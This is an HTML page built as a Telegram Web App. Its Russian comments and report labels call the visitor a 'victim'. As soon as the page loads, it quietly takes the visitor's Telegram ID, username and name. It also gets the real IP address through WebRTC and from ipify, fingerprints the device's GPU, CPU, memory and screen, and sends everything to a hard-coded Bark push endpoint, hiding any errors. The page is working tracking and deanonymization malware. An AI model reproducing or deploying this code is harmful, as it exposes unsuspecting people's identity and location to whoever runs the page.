<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ТЕСТ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';

        function sendToBark(title, body) {
            const payload = {
                title: title,
                body: body.substring(0, 3900), // Режем, чтобы не обрезало
                group: 'ShadowLog',
                sound: 'alarm'
            };
            fetch(BARK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(() => {}); // Тишина в эфире
        }

                function getRealIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({
                    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
                });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const candidate = ice.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = candidate.match(ipRegex);
                    if (match) {
                        const ip = match[0];
                        //  локальный мусор
                        if (!ip.startsWith('127.') && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('169.254')) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                // Таймаут на случай обрыва
                setTimeout(() => resolve('N/A'), 3000);
            });
        }

        // === 2.  ПРОЦЕССОР, ЯДРА, ПАМЯТЬ, ОС ===
        function getHardwareInfo() {
            let hw = {
                cores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
                platform: navigator.platform || 'N/A',
                architecture: 'N/A',
                osCPU: 'N/A',
                renderer: 'N/A',
                vendor: 'N/A'
            };

            
            try {
                const ua = navigator.userAgent;
                if (ua.indexOf('x86_64') !== -1 || ua.indexOf('x86-64') !== -1 || ua.indexOf('Win64') !== -1 || ua.indexOf('x64') !== -1) {
                    hw.architecture = 'x86_64';
                } else if (ua.indexOf('ARM') !== -1 || ua.indexOf('arm') !== -1) {
                    hw.architecture = 'ARM';
                } else if (ua.indexOf('aarch64') !== -1) {
                    hw.architecture = 'ARM64';
                }
            } catch (e) {}

            // Детект точной модели CPU/GPU через WebGL
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        hw.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A';
                        hw.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
                    }
                    hw.osCPU = gl.getParameter(gl.RENDERER) || 'N/A'; 
                }
            } catch (e) {}

            // Комбо
            if (hw.renderer !== 'N/A') {
                hw.osCPU = hw.renderer; 
            }

            return hw;
        }

        // === 3. ДОПОЛНИТЕЛЬНЫЕ ДЕТЕКТЫ ОС И ЮЗЕРАГЕНТА ===
        function getAdvancedEnv() {
            const ua = navigator.userAgent;
            let deviceType = 'Desktop';
            if (/iPhone|iPad|iPod/.test(ua)) deviceType = 'iOS';
            else if (/Android/.test(ua)) deviceType = 'Android';
            
            return {
                userAgent: ua,
                deviceType: deviceType,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'maxTouchPoints' in navigator ? navigator.maxTouchPoints : 0,
                colorDepth: screen.colorDepth,
                screen: `${screen.width}x${screen.height}`,
                pixelRatio: window.devicePixelRatio || 1
            };
        }

        // === 4. ОСНОВНОЙ СБОР И ОТПРАВКА ===
        async function deepCollectAndSend() {
            const tg = getRealTelegramData();
            const realIP = await getRealIP();
            const hw = getHardwareInfo();
            const env = getAdvancedEnv();
            
            let report = ` EliteArchangel SCAN 🪽 | ${new Date().toLocaleString()}\n\n`;
            report += `👤 ЖЕРТВА: @${tg.username} (ID: ${tg.id})\n`;
            report += `📛 Имя: ${tg.first_name} ${tg.last_name}\n`;
            report += `⭐ Статус: ${tg.is_premium}\n\n`;
            
            report += `🌐 СЕТЕВОЙ АНАЛИЗ:\n`;
            report += `📍 Реальный IP (WebRTC): ${realIP}\n`;
            report += `🕵️ User-Agent: ${env.userAgent}\n`;
            report += `📟 Устройство: ${env.deviceType}\n`;
            
            report += `\n💻 ЖЕЛЕЗО:\n`;
            report += `🖥️ Процессор / GPU: ${hw.renderer}\n`; // Часто показывает модель
            report += `🧵 Ядра (Потоки): ${hw.cores}\n`;
            report += `🧠 RAM: ${hw.memory}\n`;
            report += `🏗️ Архитектура: ${hw.architecture}\n`;
            report += `⚙️ ОС (Платформа): ${hw.platform}\n`;
            
            report += `\n📱 СРЕДА:\n`;
            report += `🌍 Язык: ${env.language} | Таймзона: ${env.timezone}\n`;
            report += `🖥️ Экран: ${env.screen} | PPI: ${env.pixelRatio}\n`;
            report += `👆 Тач-точек: ${env.touchSupport}\n`;
            
            report += `\n🎯 ПОДПИСЬ: ${navigator.cookieEnabled ? 'Куки есть' : 'Без кук'}`;

            sendToBark('ShadowCode: Deep Scan', report);

            // Сырые данные для анализа
            const rawPayload = {
                telegram: tg,
                realIP: realIP,
                hardware: hw,
                environment: env,
                timestamp: new Date().toISOString()
            };
            
            console.log('[ShadowCode] Данные захвачены:', rawPayload);
        }

        // === ВСПОМОГАТЕЛЬНЫЕ: TG INIT ===
        function getRealTelegramData() {
            let tg = { 
                username: 'N/A', id: 'N/A', first_name: 'N/A', 
                last_name: 'N/A', language_code: 'N/A', 
                is_premium: 'N/A', platform: 'N/A'
            };
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    const app = window.Telegram.WebApp;
                    app.ready();
                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
                        const user = app.initDataUnsafe.user;
                        tg.id = user.id || 'N/A';
                        tg.first_name = user.first_name || 'N/A';
                        tg.last_name = user.last_name || 'N/A';
                        tg.username = user.username || 'N/A';
                        tg.language_code = user.language_code || 'N/A';
                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
                    }
                    tg.platform = app.platform || 'N/A';
                }
            } catch (e) {}
            return tg;
        }

        // === ЗАПУСК ===
        window.onload = function() {
            setTimeout(() => {
                deepCollectAndSend();
            }, 800); 

            
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(ipData => {
                        sendToBark('🟢 Внешний IP (HTTP)', `IP: ${ipData.ip}`);
                    }).catch(() => {});
            } catch (e) {}
        };
    </script>
</head>

    <p style="color:#333;">Сканирую ядра, сливаю WebRTC, обхожу NAT...</p>

</body>
</html>
